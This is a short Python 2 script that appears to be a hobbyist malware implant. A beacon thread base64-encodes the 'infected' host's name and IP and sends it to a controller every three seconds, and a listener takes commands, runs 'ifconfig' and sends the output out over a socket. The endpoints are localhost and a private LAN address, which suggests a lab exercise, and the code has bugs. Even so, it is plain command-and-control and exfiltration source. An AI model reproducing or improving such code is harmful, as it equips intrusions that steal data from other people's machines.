
import socket, sys, os, threading, base64, time


def main():
	t=threading.Thread(target=exfil)
	t.setDaemon(True)
	try:
		t.start()
	except (KeyboardInterrupt, SystemExit):
    	t.stop()
    	sys.exit()
	beaconer()

def exfil():
	print'exfil started'
	serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serv.bind(('192.168.170.128', 50000))
	serv.listen(1)
	
	while True:
		conn, addr = serv.accept()
		print 'somone is connected'
		print 'addr'
		while True:
			from_client = ''
			data = conn.recv(4096)
			if not data: 
				break
			from_client += data
		
			print 'recieved'+from_client
			conn.send('thanks for sending me '+from_client)
			
			if from_client == 'ifconfig':
				#exfil ifconfig
				pullif=os.popen('ifconfig')
				ifoutput=pullif.read(1024)
				while (ifoutput):
					s=socket.socket()
					s.connect(('127.0.0.1', 5002))
					s.send(ifoutput)
					ifoutput=pullif.read(1024)
					print '\nDone Sending ifconfig\n'
					s.shutdown(socket.SHUT_WR)
					s.close 
					print('closed connection')
			else:
				continue
					
				
		#if from_client == 'exit':
		#serv.close()
		#sys.exit()
		#if from_client == 'write file':
		#	f=open('scarlet', 'w')
		#	f.write('hannan')
		#	print 'file written'
		
def beaconer():
	#get infected host ip and name
	targetname=socket.gethostname()
	targetIP = socket.gethostbyname(targetname)
	enctarget=base64.b64encode('infected:'+targetIP+'/'+targetname)

	while True:
		#The delay is here im not sure why
		client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			client_socket.connect(('127.0.0.1', 5001))
			client_socket.send('srfa\n')
			while True:	
				client_socket.send(enctarget+'\n')
				time.sleep(3)
		except socket.error:
			pass
			
main()
